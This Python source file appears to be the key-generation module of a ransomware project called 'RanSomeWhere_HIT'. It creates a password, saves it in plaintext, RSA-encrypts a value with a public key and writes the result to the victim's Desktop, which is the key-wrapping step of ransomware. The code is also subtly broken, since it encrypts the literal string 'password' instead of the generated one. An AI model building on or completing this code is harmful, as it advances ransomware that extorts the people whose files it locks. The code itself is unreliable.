import gen_pass
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import aes,os,binascii

def gen():

    password =gen_pass.generate()
    key = open("public_key_str.pem", "rb")
    public_key =key.read()
    key.close()

    with open("password.txt", "w") as external_file:
        add_text = password
        print(add_text, file=external_file)
        external_file.close()
    
    recipient_key = RSA.import_key(public_key)
    encryptorRSA = PKCS1_OAEP.new(recipient_key)
    enckey=encryptorRSA.encrypt(b"password")

    f=open(os.environ['HOME'] +'/Desktop/RanSomeWhere_HIT/pass','wb')
    f.write(binascii.hexlify(enckey))
    f.close()

    return password